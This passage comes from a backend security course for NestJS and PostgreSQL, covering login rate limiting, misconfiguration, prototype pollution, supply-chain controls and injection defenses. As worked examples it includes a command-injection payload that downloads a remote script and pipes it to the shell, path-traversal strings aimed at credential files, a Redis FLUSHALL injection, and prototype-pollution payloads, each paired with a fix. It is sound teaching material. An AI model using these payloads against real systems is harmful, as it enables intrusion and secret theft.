    await this.redis.client.multi().incr(failKey).expire(failKey, 900).exec();
    throw new UnauthorizedException('Invalid email or password');       // identical for unknown email and wrong password
  }
  await this.redis.client.del(failKey);
  await this.audit.record('login.success', { userId: user.id, ip: meta.ip, ua: meta.userAgent });
  if (await this.devices.isNew(user.id, meta)) await this.mailer.newDeviceLogin(user.email, meta);
  return this.tokens.issuePair(user);
}

PostgreSQL example

SQL
CREATE TABLE password_resets (
  id         uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id    uuid NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  token_hash text NOT NULL UNIQUE,
  created_at timestamptz NOT NULL DEFAULT now(),
  expires_at timestamptz NOT NULL,
  used_at    timestamptz,
  request_ip inet
);
-- Only one live reset per user: issuing a new one invalidates the old.
CREATE UNIQUE INDEX password_resets_one_live_idx ON password_resets (user_id) WHERE used_at IS NULL;

-- Consume atomically; the WHERE clause is the whole security check.
UPDATE password_resets SET used_at = now()
WHERE token_hash = $1 AND used_at IS NULL AND expires_at > now()
RETURNING user_id;

The UPDATE ... RETURNING makes the reset race-free: two concurrent submissions of the same token cannot both succeed, because only one update matches used_at IS NULL.

Production scenario

A consumer app sees 15 million login attempts a month, of which about 2 million are credential stuffing. Per-IP limits catch almost none (residential proxies). Per-account limits plus a global "failure rate above 3x baseline" alert catch the campaigns within minutes; the response is to require a captcha on login for 24 hours and to force resets on accounts that had a successful login from a new country during the campaign. Reset tokens are consumed at about 3,000 per day; expired rows are purged nightly.

Failure scenario

At 03:40 the login failure rate went from 4 percent to 61 percent. A stuffing campaign was running at 300 requests per second. Per-IP throttling did nothing (12,000 IPs). The account-level counter blocked most accounts after 5 attempts, which was the intended defense, but the attacker then switched to one attempt per account across 2 million accounts, under the threshold. What finally stopped it was the global alert and a captcha switch. Post-incident, the team added device fingerprint scoring and a "new device requires email confirmation" step for accounts with no MFA.

Edge cases & failure modes

  • Lockouts weaponised to deny service to real users; use delays and captchas, not hard locks.
  • Rate limits keyed by IP behind a load balancer that hides the client IP; configure trust proxy and use X-Forwarded-For carefully (only trust your own proxies).
  • Timing differences from cache hits (user row cached vs not); measure.
  • Reset tokens in GET URLs leaking via Referer; use Referrer-Policy: no-referrer and POST.
  • Reset email sent to an unverified new email address after an email change; require confirmation of the new address first.
  • OAuth "login with" flows that bypass account lockout state.
  • Race in password reset: two submissions of the same token; atomic consume.
  • Registration enumeration through "email taken" errors; also through timing and through the forgot endpoint.

How a Senior Backend Engineer thinks about this

They treat the auth endpoints as a product surface under permanent attack and instrument them first: failure rate, per-account failures, new-device logins, reset volume. They design lockouts that cannot be turned against users, uniform responses and timings, and a reset flow with hashed single-use tokens and atomic consumption. They push MFA and passkeys for the accounts that matter, because rate limiting is a delay, not a defense, against a patient attacker.

Common mistakes

  • Different error messages per failure type.
  • Hard lockout after 5 failures with no self-service unlock.
  • Reset tokens that live for 24 hours and can be used twice.
  • No notification on password change.
  • Only IP-based limits.

Interview questions

  1. How do you stop credential stuffing when the attacker has 10,000 IPs?
    Show answerHide answer
    Expected: per-account counters, global failure rate, captcha, device signals, MFA.
  2. Design a secure password reset flow end to end.
    Show answerHide answer
    Expected: uniform response, random hashed token, short expiry, single use, atomic consume, session invalidation, notification, POST submit.
  3. How can user enumeration happen even with uniform messages?
    Show answerHide answer
    Expected: timing, registration and reset endpoints, response size.
  4. Why is account lockout dangerous and what do you do instead?

Practical exercise

Implement login and reset with the code above. Write tests for: same message and timing (within 10 percent over 50 samples) for unknown vs wrong password; sixth failed login returns 429 with retryAfterSeconds; a reset token used twice fails the second time even when the two requests are concurrent; a password change invalidates all refresh tokens. Acceptance criteria: all pass; the reset link is submitted by POST; the reset page sets Referrer-Policy: no-referrer.

40.26 Security Misconfiguration

Concept

Security misconfiguration is the category of "it worked in dev and nobody changed it": debug endpoints in production, CORS: * with credentials, default credentials on Redis or Grafana, verbose stack traces in error responses, Swagger UI open on the public API, TypeORM synchronize: true on production (which drops and recreates columns on a schema change), Prometheus /metrics exposed to the internet, security groups allowing 0.0.0.0/0 to port 5432.

Why does it exist?

Defaults are chosen for developer convenience. Production hardening is a checklist that competes with feature work, and nothing fails visibly when it is skipped. The fix is to make hardening the default in the templates and images every service starts from, and to scan for drift.

Mental model

Imagine a house where the builder leaves every window open and a spare key under the mat, because that made it easier for the trades to come and go. Moving in without a walk-through means living in a house with the doors the builder left open.

How it works

Exploit examples and fixes:

Misconfiguration Exploit Fix
CORS origin: '*' with credentials: true (or origin reflected from the request) Any site reads authenticated API responses in the victim's browser Explicit origin allow-list; never reflect; credentials only with a specific origin
Verbose errors (stack, SQL text, file paths) Attacker learns internals, ORM, table names Global exception filter that logs details and returns a generic body with a correlation id
Swagger UI open in production Complete API map, including admin routes, for anyone Disable in production or protect behind auth and IP allow-list
synchronize: true in TypeORM Schema changes on deploy drop columns and data; an entity rename deletes a table Migrations only; synchronize: false enforced in config
/metrics, /health with details, /debug endpoints public Internal topology, versions, dependency status Separate management port or auth; expose only liveness publicly
Default credentials (Redis without requirepass, postgres/postgres, Grafana admin/admin) Full access from anywhere that can reach the port Unique credentials from the secrets manager; network policy
Security group 0.0.0.0/0 on 5432 or 6379 Database on the internet Private subnets; access only from app security group; bastion or SSM for humans
NODE_ENV not production Slower, more verbose, some libraries enable debug features Set explicitly in the image
Directory listing, .git folder, .env in the served directory Source and secrets download Do not serve static files from the repo root; multi-stage Docker builds
Container running as root Container escape becomes host root USER node in the Dockerfile; read-only filesystem; drop capabilities

NestJS example

Hardened bootstrap: explicit CORS, a global exception filter that hides internals, Swagger only outside production, and a management port for metrics.

TypeScript
// main.ts
const isProd = process.env.NODE_ENV === 'production';
app.enableCors({
  origin: cfg.getOrThrow<string>('WEB_ORIGINS').split(','),   // explicit list; a function can validate against a DB for multi-tenant domains
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token', 'Idempotency-Key'],
  maxAge: 600,
});
app.useGlobalFilters(new SafeExceptionFilter());
if (!isProd) {
  const doc = SwaggerModule.createDocument(app, new DocumentBuilder().setTitle('API').build());
  SwaggerModule.setup('docs', app, doc);
}
TypeScript
// safe-exception.filter.ts
@Catch()
export class SafeExceptionFilter implements ExceptionFilter {
  private readonly logger = new Logger(SafeExceptionFilter.name);
  catch(exception: unknown, host: ArgumentsHost) {
    const res = host.switchToHttp().getResponse<Response>();
    const req = host.switchToHttp().getRequest<Request>();
    const correlationId = (req.headers['x-request-id'] as string) ?? randomUUID();
    if (exception instanceof HttpException) {
      const status = exception.getStatus();
      const body = exception.getResponse();
      return res.status(status).json(typeof body === 'string' ? { message: body, correlationId } : { ...(body as object), correlationId });
    }
    // Unknown error: full details to the log, nothing to the client.
    this.logger.error({ correlationId, path: req.path, err: exception instanceof Error ? exception.stack : String(exception) });
    return res.status(500).json({ message: 'Internal server error', correlationId });
  }
}
TypeScript
// data-source config: make the dangerous option impossible in production
export const dataSourceOptions: DataSourceOptions = {
  type: 'postgres',
  url: cfg.getOrThrow('DATABASE_URL'),
  synchronize: false,                                   // always; migrations are the only path
  migrationsRun: false,                                 // run migrations as a deploy step, not at app start
  ssl: isProd ? { rejectUnauthorized: true } : false,
  logging: isProd ? ['error'] : ['query', 'error'],
  extra: { max: 20, statement_timeout: 10_000 },
};

PostgreSQL example

SQL
-- pg_hba.conf: no `trust`, no `0.0.0.0/0`; scram-sha-256 only over TLS
-- hostssl  all  all  10.0.0.0/8  scram-sha-256
-- Find roles with dangerous attributes:
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolbypassrls, rolconnlimit
FROM pg_roles WHERE rolname NOT LIKE 'pg_%';
-- The application roles should show f, f, f, f and a connection limit.

-- Revoke the default PUBLIC privileges on the schema (PG15+ does this by default):
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON DATABASE app FROM PUBLIC;

Production scenario

A platform runs a weekly configuration scan: CORS headers on every public host, presence of /docs, /metrics, /.env, /.git/config, response headers for stack traces, open ports via the cloud provider's security group API, and a TypeORM config lint for synchronize. Findings open tickets automatically. The service template repository ships with the hardened main.ts, so new services start correct.

Failure scenario

A staging deploy with synchronize: true was promoted to production by copying the config. An entity property had been renamed from phone to phoneNumber. TypeORM dropped phone and added phone_number, deleting 900,000 phone numbers on startup. Restore from backup took four hours and lost 20 minutes of writes. synchronize is now rejected by a config schema at boot when NODE_ENV=production.

Edge cases & failure modes

  • CORS origin validated by origin.endsWith('example.com'), which matches evilexample.com.
  • Access-Control-Allow-Origin: null accepted (sandboxed iframes send null).
  • Health endpoints returning dependency versions and hostnames.
  • Debug logging left at query level, writing every parameter (including passwords in INSERT) to logs.
  • Kubernetes dashboards, Redis Commander, pgAdmin exposed through an ingress "for a demo".
  • Image tags latest and base images never rebuilt.
  • Error pages from the load balancer or a framework revealing versions.

How a Senior Backend Engineer thinks about this

They put hardening in the template, not in the checklist, and they scan for drift because templates get edited. They keep production, staging and dev configs in one typed schema validated at boot, with production-only assertions (synchronize=false, docs=off, cors explicit). They give management endpoints their own port and network policy. They treat "we will lock it down before launch" as a sentence that has never once been true.

Common mistakes

  • origin: true (reflect) in CORS.
  • Swagger with Bearer auth helper in production, doubling as an attack console.
  • Returning error.message from ORM errors (leaks SQL and table names).
  • Running migrations automatically at app start with several replicas racing.

Interview questions

  1. Why is Access-Control-Allow-Origin: * with credentials a critical bug?
    Show answerHide answer
    Expected: any site can read authenticated responses; browsers actually forbid the literal * with credentials, so the real bug is reflection.
  2. What does synchronize: true do and why must it never reach production?
  3. How would you design error responses to be safe and still debuggable?
    Show answerHide answer
    Expected: correlation id, full details in logs, generic body.
  4. Name five things you would scan for weekly on a public API.

Practical exercise

Write a boot-time config validator (zod or class-validator on the config object) that fails startup in production if synchronize is true, Swagger is enabled, CORS origins include *, or NODE_ENV is not production. Acceptance criteria: each condition is covered by a test that asserts startup fails with a clear message; a scan script checks the deployed API for /docs, /metrics, stack traces and CORS reflection and exits non-zero on any finding.

40.27 Insecure Deserialization and Prototype Pollution

Concept

Deserialization turns bytes into objects. In Node the usual format is JSON, which is safe as a parser (JSON.parse does not execute code), but the object it produces can be dangerous to the code that consumes it. Prototype pollution is the JavaScript-specific hazard: a payload like {"__proto__": {"isAdmin": true}} merged into another object with a naive recursive merge sets isAdmin on Object.prototype, and suddenly every object in the process has isAdmin === true. Other formats are worse: YAML parsers with custom tags, node-serialize, and anything that revives functions can execute attacker code directly.

Why does it exist?

JavaScript objects have a prototype chain, and the keys __proto__, constructor, and prototype are reachable through ordinary property access. Utilities that copy properties from input into objects (merge, extend, defaults, set with a path) become gadgets. The class-transformer library that NestJS uses to build DTOs copies properties too, which is why whitelist matters beyond mass assignment.

Mental model

Imagine a company where every employee's badge is printed from a template. An attacker who can edit the template changes every badge at once. Object.prototype is the template for every object; polluting it changes every object in the process.

How it works

Exploit example:

  1. The app has a "settings" endpoint that deep-merges the request body into the user's existing settings with lodash.merge (older versions) or a hand-written recursive merge.
  2. The attacker sends {"__proto__": {"role": "admin"}}.
  3. The merge walks into __proto__ and sets role on Object.prototype.
  4. Elsewhere, if (user.role === 'admin') on a user object with no role property now finds 'admin' through the prototype chain. Or a template engine finds outputFunctionName on options and executes code. Or class-validator finds a polluted forbidUnknownValues.

Fixes:

  1. ValidationPipe({ whitelist: true, forbidNonWhitelisted: true }) so bodies become DTO instances with only declared properties; class-transformer's plainToInstance with excludeExtraneousValues is the stricter variant.
  2. Never deep-merge request data into existing objects. If you must merge, use a merge that skips __proto__, constructor and prototype, or create objects with Object.create(null) for dictionaries.
  3. Keep dependencies patched; lodash.merge, minimist, qs, deep-extend all had pollution CVEs.
  4. Use JSON.parse only; never eval, vm.runInNewContext on input, node-serialize, or YAML with custom types (js-yaml load is safe by default since v4; yaml package is safe; avoid DEFAULT_FULL_SCHEMA).
  5. Body size limits (express.json({ limit: '1mb' })) and a depth cap for nested JSON, because a 10 MB deeply nested body is a CPU denial of service.
  6. Optionally freeze the prototype at startup: Object.freeze(Object.prototype). It breaks some libraries; test before enabling.

NestJS example

TypeScript
// main.ts: size and depth limits, plus prototype pollution hardening
const app = await NestFactory.create<NestExpressApplication>(AppModule, { bodyParser: false });
app.use(express.json({ limit: '1mb' }));                  // before NestJS body handling
app.use(express.urlencoded({ extended: false, limit: '200kb' })); // extended:false uses querystring, not qs (no nested objects)

// Middleware rejecting polluted keys anywhere in the body
app.use((req: Request, _res: Response, next: NextFunction) => {
  const seen = new WeakSet<object>();
  const walk = (v: unknown, depth: number): boolean => {
    if (depth > 20) return false;                          // depth cap
    if (v && typeof v === 'object') {
      if (seen.has(v)) return true; seen.add(v);
      for (const k of Object.keys(v)) {
        if (k === '__proto__' || k === 'constructor' || k === 'prototype') return false;
        if (!walk((v as Record<string, unknown>)[k], depth + 1)) return false;
      }
    }
    return true;
  };
  if (req.body !== undefined && !walk(req.body, 0)) return next(new BadRequestException('Invalid payload'));
  next();
});
TypeScript
// settings.service.ts: explicit, shallow, typed merge instead of deep-merge
async update(userId: string, dto: UpdateSettingsDto) {
  const current = await this.repo.findOneByOrFail({ userId });
  current.theme = dto.theme ?? current.theme;
  current.notifications = { ...current.notifications, ...pick(dto.notifications ?? {}, ['email', 'sms', 'push']) }; // allow-listed keys only
  return this.repo.save(current);
}

PostgreSQL example

jsonb columns are a common landing place for merged settings. Validate the shape before storing and never store __proto__ keys; PostgreSQL does not care, but the next JSON.parse in your app does.

SQL
-- Reject polluted keys at the database as a backstop:
ALTER TABLE user_settings ADD CONSTRAINT no_proto_keys
  CHECK (NOT (settings ? '__proto__' OR settings ? 'constructor' OR settings ? 'prototype'));

Production scenario

A product with a rich "preferences" JSON document per user. All writes go through a DTO with @ValidateNested() and known keys; the pollution-scanning middleware costs about 20 microseconds per request. Body limit is 1 MB; the largest legitimate payload is 60 KB. Dependabot keeps lodash, qs and friends current.

Failure scenario

A template-rendering service used a popular engine with a known prototype-pollution-to-RCE gadget. A "custom fields" endpoint deep-merged input into a settings object. An attacker set __proto__.outputFunctionName to a shell payload; the next email render executed it and the pod ran a crypto miner for two days before CPU alerts fired. Fixes: whitelist DTOs, no deep merge, engine upgrade, egress restrictions so the pod could not download payloads.

Edge cases & failure modes

  • qs (used by extended: true URL encoding) creates nested objects from a[b][c]=1; older versions allowed __proto__ paths.
  • JSON.parse reviver functions that assign into objects.
  • class-transformer @Transform handlers that copy arbitrary keys.
  • Object.freeze(Object.prototype) breaking polyfills.
  • YAML config loaded from user-supplied files (CI pipelines, import features).
  • Deeply nested JSON exhausting the stack or CPU; depth and size caps.
  • structuredClone and JSON.parse(JSON.stringify(x)) are safe copies, unlike merge.

How a Senior Backend Engineer thinks about this

They accept only DTO-shaped input, they never merge input into state, and they treat any library that "recursively assigns" as suspect. They keep the JSON body limit small and enforced before the framework sees the body. They know the gadget chains exist in template engines and ORMs and keep those patched with priority.

Common mistakes

  • Object.assign or spread of req.body into an entity (also mass assignment).
  • lodash.merge(existing, req.body).
  • Unbounded body size.
  • extended: true URL encoding on public endpoints.

Interview questions

  1. What is prototype pollution and why is it uniquely a JavaScript problem?
    Show answerHide answer
    Expected: prototype chain reachable through __proto__; global effect.
  2. Is JSON.parse safe? Where does the danger begin?
    Show answerHide answer
    Expected: parser is safe; consumers that merge are not.
  3. What controls stop a pollution payload before it reaches business logic in NestJS?
  4. How can pollution become remote code execution?
    Show answerHide answer
    Expected: gadgets in template engines and libraries reading options from polluted prototypes.

Practical exercise

Add the pollution-scanning middleware and body limits. Send {"__proto__":{"polluted":true}} and {"constructor":{"prototype":{"polluted":true}}} to every POST/PATCH route and then check ({}).polluted inside a health endpoint. Acceptance criteria: both payloads are rejected with 400; ({}).polluted is undefined; a 2 MB body is rejected before reaching any controller; the jsonb constraint rejects a direct insert with a __proto__ key.

40.28 Dependency Vulnerabilities and Supply Chain

Concept

Your NestJS app is a few thousand lines of your code on top of a few hundred thousand lines of other people's code, pulled from npm. A vulnerability in express, jsonwebtoken, axios, lodash, or a transitive dependency five levels down is a vulnerability in your app. Supply-chain attacks go further: an attacker publishes a malicious version of a real package (compromised maintainer account), a typo-squatted package (lodahs), or a package that runs a postinstall script stealing environment variables from CI.

Why does it exist?

npm's model is "trust the registry and every maintainer of every transitive dependency". Automatic semver ranges (^1.2.3) pull new versions silently. Install scripts run arbitrary code. CI systems hold secrets in environment variables. Each of these is convenient and each is an attack path.

Mental model

Imagine building a house from parts made by 800 suppliers you have never met, delivered daily, some of which include instructions that your builders follow blindly on delivery. Lockfiles are the bill of materials; audits are the inspections; pinned versions and no install scripts are the rule that nothing gets used until inspected.

How it works

Controls, in order of value:

  1. Lockfile committed and honoured: package-lock.json or pnpm-lock.yaml in git; npm ci (never npm install) in CI and Docker so builds are reproducible and cannot silently pick a newer version.
  2. Automated scanning: npm audit in CI (with a policy: fail on high and critical, allow-list known non-exploitable findings with expiry dates), plus Dependabot or Snyk for pull requests with fixes. Renovate is the common alternative.
  3. Pinning and slow-rolling: exact versions for critical packages (jsonwebtoken, passport-jwt, pg, typeorm); a policy to wait a few days after a new release before adopting (many malicious versions are pulled within 48 hours).
  4. No install scripts: npm ci --ignore-scripts where possible, with an explicit allow-list for packages that legitimately need them (bcrypt, argon2, sharp build native code; prefer prebuilt binaries).
  5. Minimal base images: node:20-alpine or distroless, multi-stage builds that copy only dist/ and production dependencies, run as non-root, and are rebuilt weekly to pick up OS patches. Scan images with Trivy or Grype in CI.
  6. Provenance: prefer packages with npm provenance attestations; use a private registry proxy (Artifactory, Verdaccio) that caches and can block packages.
  7. SBOM: generate a software bill of materials (CycloneDX) per build so that when the next log4j-style event happens you can answer "are we affected" in minutes, not days.
  8. CI hygiene: secrets scoped per job, no long-lived cloud keys in CI (OIDC federation instead), postinstall cannot reach production secrets because production secrets are not in CI.

NestJS example

A Dockerfile and a CI policy that implement the controls.

Dockerfile
# Dockerfile: reproducible, minimal, non-root
FROM node:20-alpine AS build
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --ignore-scripts                      # exact versions from the lockfile; no install scripts
COPY tsconfig*.json nest-cli.json ./
COPY src ./src
RUN npm run build && npm prune --omit=dev

FROM node:20-alpine
RUN addgroup -S app && adduser -S app -G app
WORKDIR /app
COPY --from=build --chown=app:app /app/node_modules ./node_modules
COPY --from=build --chown=app:app /app/dist ./dist
COPY --chown=app:app package.json ./
USER app
ENV NODE_ENV=production
CMD ["node", "dist/main.js"]
YAML
# .github/workflows/security.yml (excerpt)
- run: npm ci --ignore-scripts
- run: npm audit --audit-level=high            # fails the job on high/critical
- run: npx @cyclonedx/cyclonedx-npm --output-file sbom.json
- uses: aquasecurity/trivy-action@0.28.0
  with: { image-ref: "ghcr.io/example/api:${{ github.sha }}", severity: "HIGH,CRITICAL", exit-code: "1" }

Production scenario

A company with 30 Node services runs Renovate with a 3-day minimum release age, npm audit gating, Trivy on images, and a private registry proxy. When a widely used package was compromised, the proxy's block-list stopped the malicious version within an hour of the advisory; the SBOM query showed 4 services with the package and none had built in the affected window. Base images are rebuilt every Monday; the median time from an OS CVE to patched images in production is 3 days.

Failure scenario

A CI pipeline ran npm install (not ci) with a floating range on a small utility package. The maintainer's account was hijacked and a version with a postinstall script that read process.env and posted it to a remote server was published. The pipeline's environment contained an AWS key with broad permissions. The attacker created EC2 instances for mining within 20 minutes. Fixes: npm ci --ignore-scripts, OIDC-federated short-lived cloud credentials in CI, a 3-day release-age policy, and secret scanning on outbound CI traffic.

Edge cases & failure modes

  • npm audit noise: hundreds of findings in dev dependencies that never ship; scope the policy to production dependencies and triage with expiry dates.
  • Native modules that need install scripts; use prebuilt binaries or allow-list them.
  • Docker builds pulling latest base images and drifting.
  • Vulnerable code in vendored or copy-pasted snippets that no scanner sees.
  • Transitive dependency pinned by a lockfile but a security fix only available through a major upgrade of the parent.
  • Abandoned packages with no maintainer to fix anything; plan replacements.

How a Senior Backend Engineer thinks about this

They accept that they cannot review every dependency and therefore build controls that limit what a bad dependency can do: no install scripts, no secrets in CI beyond short-lived federated ones, minimal images, network egress rules in production. They keep the dependency count low by preferring the standard library and a few well-maintained packages. They keep an SBOM so the next "are we affected" takes minutes.

Common mistakes

  • npm install in CI.
  • Ignoring npm audit because it is noisy, instead of tuning the policy.
  • Long-lived cloud keys in CI environment variables.
  • Root user in containers.
  • Never rebuilding images.

Interview questions

  1. npm install vs npm ci: why does it matter for security?
    Show answerHide answer
    Expected: lockfile honoured; reproducibility.
  2. How do you limit the blast radius of a malicious postinstall?
    Show answerHide answer
    Expected: ignore scripts, no secrets in CI, federated credentials, egress limits.
  3. What is an SBOM and when did you last need one?
  4. How would you respond to a critical CVE in a transitive dependency with no upstream fix?
    Show answerHide answer
    Expected: overrides/resolutions, patch-package, vendoring, WAF mitigation, compensating controls.

Practical exercise

Convert a project to npm ci --ignore-scripts, add npm audit --audit-level=high and Trivy to CI, produce an SBOM, and switch the Dockerfile to a multi-stage non-root build. Acceptance criteria: CI fails on an injected vulnerable version of a dependency; the image runs as a non-root user; the SBOM lists every production package with its version; the build is reproducible (two builds from the same commit produce the same dependency tree).

40.29 Injection beyond SQL

Concept

SQL injection gets all the attention, but SQL is only one of the interpreters your process talks to. An interpreter is anything that reads a string and decides what to do based on its structure: a shell, a filesystem path resolver, the Redis wire protocol, a query-object builder, the HTTP header parser, a log parser, a template engine.

Injection is always the same bug wearing different clothes: untrusted data crosses from being a value to being part of the syntax. The user was supposed to supply a filename; they supplied a filename plus a semicolon plus a command. The user was supposed to supply an invoice id; they supplied ../../../etc/passwd. The interpreter cannot tell the difference, because by the time it sees the string, your data and their data are the same characters.

So the defense is always the same shape too: keep data out of the syntax. Pass arguments as arguments, not as concatenated text. Where the interpreter has no parameterised form, validate against an allow-list of exactly what you expect, and reject everything else.

Why does it exist?

Because string concatenation is the easiest thing to type. `wkhtmltopdf ${input}.pdf` is one line and works on your machine the first time. Parameterisation is two or three lines and forces you to think about what the argument actually is. Every injection vulnerability in history started as a shortcut that worked in development.

The second reason is that most engineers have a mental list with one item on it: "use parameterised queries". They apply it religiously to PostgreSQL and then build a shell command with a template literal ten lines later, because shells did not appear on the list.

Mental model

Imagine you take a delivery address over the phone and read it out to a courier. The customer says: "14 Oak Street. And when you get there, also load everything in the warehouse into your van and drive it to 9 Elm Road." You repeat it word for word. The courier obeys, because the courier cannot tell where your instructions end and the customer's begin.

Every interpreter is that courier. Parameterisation is the fix: instead of reading a sentence, you hand the courier a form with an address box. Whatever the customer wrote goes in the box and stays in the box.

How it works

Seven families you will actually meet in a NestJS + PostgreSQL e-commerce service.

1. Command injection through child_process.exec

The reporting service turns an HTML invoice into a PDF and lets the user name the file:

TypeScript
// VULNERABLE: reports.service.ts
import { exec } from 'node:child_process';
import { promisify } from 'node:util';
const execAsync = promisify(exec);

async generatePdf(htmlPath: string, dto: { filename: string }) {
  // exec() runs the string through /bin/sh -c. Every shell metacharacter is live.
  await execAsync(`wkhtmltopdf ${htmlPath} /var/reports/${dto.filename}.pdf`);
  return `/var/reports/${dto.filename}.pdf`;
}

The exploit is a POST /reports with:

JSON
{ "filename": "q3; curl -s http://198.51.100.7/x.sh | sh #" }

The shell sees two commands. The second one downloads and runs a script as the Node user, which in a typical container means read access to every environment variable, including DATABASE_URL and the JWT signing key. If the container runs as root (a common default), it means the whole container.

Variations that bypass a naive blocklist of ;: backticks, $(...), &&, ||, newline, |, and ${IFS} when spaces are filtered.

The fix has three layers:

TypeScript
// FIXED: reports.service.ts
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { randomUUID } from 'node:crypto';
import * as path from 'node:path';
const execFileAsync = promisify(execFile);

const REPORT_DIR = '/var/reports';

async generatePdf(htmlPath: string, dto: { label?: string }) {
  // 1. The server names the file. The user gets a label stored in the database, not in the path.
  const key = `${randomUUID()}.pdf`;
  const out = path.join(REPORT_DIR, key);

  // 2. execFile does NOT spawn a shell: args are passed to execve as an array.
  //    "; curl ..." would be one literal argv entry, meaningless to wkhtmltopdf.
  await execFileAsync('/usr/bin/wkhtmltopdf', ['--disable-local-file-access', htmlPath, out], {
    timeout: 30_000,          // a hung renderer must not hold a worker forever
    maxBuffer: 1024 * 1024,
  });

  await this.repo.insert({ key, label: dto.label?.slice(0, 120) ?? 'Report' });
  return key;
}

Layer three is argument injection, which survives even without a shell. If the user controls the first characters of an argv entry, they can turn a value into a flag: --output=/etc/cron.d/x, or for curl, -o /app/dist/main.js. So validate the shape of anything you pass, and put -- before positional arguments when the tool supports it. If you validate a user-supplied token at all, the rule is /^[A-Za-z0-9_-]{1,64}$/ and nothing else.

2. Path traversal in a download endpoint

TypeScript
// VULNERABLE: files.controller.ts
@Get('invoices/:name')
download(@Param('name') name: string, @Res() res: Response) {
  return res.sendFile(path.join('/var/app/invoices', name));
}

GET /files/invoices/..%2F..%2F..%2Fetc%2Fpasswd works because Express decodes percent-escapes before your handler sees the parameter, and path.join happily normalises ../.. upward. On a container, /proc/self/environ is a better prize than /etc/passwd: it hands the attacker every secret in the process environment.

Traversal is not always ../. Watch for absolute paths (/etc/passwd as the whole parameter beats path.join if you use path.resolve carelessly), Windows separators (..\\), double encoding (%252e%252e%252f), unicode look-alikes, and a trailing null byte in older runtimes.

TypeScript
// FIXED: resolve, then prove the result is inside the base directory.
import * as path from 'node:path';

const BASE = path.resolve('/var/app/invoices');

export function resolveWithin(base: string, candidate: string): string {
  const full = path.resolve(base, candidate);
  // The trailing separator matters: '/var/app/invoices-evil' startsWith '/var/app/invoices'.
  if (full !== base && !full.startsWith(base + path.sep)) {
    throw new BadRequestException('Invalid path');
  }
  return full;
}

That is the mechanical fix, and it is the second line of defense. The real fix is to never let a user-supplied string become a path at all:

TypeScript
// BEST: the user supplies an id; the database supplies the key. There is no traversal surface.
@Get('invoices/:id')
async download(@CurrentUser() user: JwtUser, @Param('id', ParseUUIDPipe) id: string, @Res() res: Response) {
  const inv = await this.repo.findOne({ where: { id, customerId: user.sub } }); // ownership check too
  if (!inv) throw new NotFoundException();
  return res.sendFile(resolveWithin(BASE, inv.storageKey), {
    headers: { 'Content-Disposition': `attachment; filename="invoice-${inv.number}.pdf"` },
  });
}

3. Redis command injection and why ioredis protects you

Old Redis clients built commands by concatenating text into the inline protocol, so a value containing \r\n could start a new command: a "username" of alice\r\nFLUSHALL\r\n really did flush the database. Modern clients, ioredis included, speak RESP, where every argument is length-prefixed:

Text
*3\r\n$3\r\nSET\r\n$12\r\nsession:1234\r\n$25\r\n{"userId":"alice\r\nEVIL"}\r\n

The server reads $25 and then takes exactly 25 bytes as data. \r\n inside those bytes is data, not a delimiter. That is parameterisation, done by the protocol. ioredis's redis.set(key, value) builds this framing for you, which is why you do not need to escape anything.

Two real risks remain:

  • Key namespace collision. redis.get(\session:${req.params.id}`)with an id of../or of another user's id is not protocol injection, it is authorization failure by string building. Namespace deliberately, validate ids, and never build a key from raw user text:session:${uuidValidate(id) ? id : throw}`.
  • Lua script injection. EVAL takes a script as a string. If you concatenate user data into the script body, you have injection into a full programming language running inside Redis, single-threaded, with access to every key.
TypeScript
// VULNERABLE: user data becomes Lua source
await redis.eval(`return redis.call('GET', '${key}')`, 0);

// FIXED: script is a constant; data arrives as KEYS and ARGV
const RESERVE = `
  local left = tonumber(redis.call('GET', KEYS[1]) or '0')
  if left < tonumber(ARGV[1]) then return -1 end
  return redis.call('DECRBY', KEYS[1], ARGV[1])`;
const remaining = await redis.eval(RESERVE, 1, `stock:${skuId}`, String(qty));

4. NoSQL-style injection and unvalidated operator objects

The classic is MongoDB's $where, which evaluates JavaScript on the server:

JavaScript
db.users.find({ $where: `this.email == '${email}'` });   // email = "' || true || '"  returns every user

Node's version of this bug appears even in a PostgreSQL shop, because HTTP query strings and JSON bodies can produce objects where you expected strings. Express's qs parser turns ?id[gt]=0 into { id: { gt: '0' } }. Hand that object to an ORM that accepts operator objects and the meaning of your query changes:

TypeScript
// VULNERABLE: Sequelize with operator aliases enabled, or any code that forwards a raw filter object
const products = await Product.findAll({ where: req.body.filter });
// body: { "filter": { "price": { "$gt": 0 }, "tenantId": { "$ne": null } } }
// The tenant filter the developer "knew" was there is now overwritten by the attacker.

Sequelize v6 removed string operator aliases by default for exactly this reason (operatorsAliases must be opted into), but the general pattern survives wherever a request-shaped object reaches a where. The fix is not escaping; it is refusing to accept structure from the client:

TypeScript
// FIXED: a DTO of scalars, and a server-built where clause.
